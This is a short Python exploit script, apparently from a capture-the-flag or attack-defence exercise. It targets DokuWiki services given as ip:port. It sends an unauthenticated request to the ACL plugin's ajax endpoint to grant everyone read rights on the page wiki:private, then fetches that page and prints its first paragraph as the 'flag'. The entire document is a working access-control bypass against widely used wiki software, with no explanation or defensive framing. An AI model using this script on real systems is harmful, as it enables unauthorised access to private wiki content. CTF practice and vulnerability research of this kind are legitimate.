import requests
import sys

# Arguments are the target services each given as <ip>:<port>
TARGET_SERVICE = sys.argv[1]

# First, set the ACL for the wiki:private page
acl_url = f"http://{TARGET_SERVICE}/lib/plugins/acl/ajax.php"
acl_params = {
    'ajax': 'info',
    'id': 'wiki:private',
    'acl_w': '@ALL',
    'cmd[save]': '1',
    'acl': '2'
}
requests.get(acl_url, params=acl_params)

# Retrieve the content of the wiki:private page
wiki_url = f"http://{TARGET_SERVICE}/doku.php?id=wiki:private"
response = requests.get(wiki_url)
response_text = response.text

# Find the content between <!-- wikipage start --> and <!-- wikipage stop -->
start_marker = '<!-- wikipage start -->'
end_marker = '<!-- wikipage stop -->'

start_index = response_text.find(start_marker)
end_index = response_text.find(end_marker)

if start_index != -1 and end_index != -1:
    # Extract the content within the markers
    content = response_text[start_index + len(start_marker):end_index]

    # Further narrow down to the <p> tags within the extracted content
    p_start_marker = '<p>'
    p_end_marker = '</p>'

    p_start_index = content.find(p_start_marker)
    p_end_index = content.find(p_end_marker)

    if p_start_index != -1 and p_end_index != -1:
        flag = content[p_start_index + len(p_start_marker):p_end_index].strip()
    else:
        flag = ""
else:
    flag = ""

# The only output should be the content of the note
print(flag)

